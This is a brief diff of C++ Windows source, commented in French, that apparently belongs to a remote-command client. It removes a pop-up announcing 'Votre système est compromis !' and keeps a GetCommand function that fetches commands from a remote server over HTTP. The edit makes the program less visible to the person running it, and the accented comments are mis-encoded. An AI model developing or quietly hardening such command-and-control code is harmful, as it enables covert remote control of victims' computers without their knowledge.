@@ -12,11 +12,6 @@ using namespace std;
 
 #pragma comment(lib, "wininet.lib")
 
-// Affiche une bo�te de dialogue d'alerte.
-void ShowMessage() {
-    MessageBox(NULL, TEXT("Votre syst�me est compromis !"), TEXT("Alerte"), MB_OK);
-}
-
 // Effectue une requ�te HTTP GET pour r�cup�rer une commande depuis un serveur distant.
 string GetCommand() {
     string command;
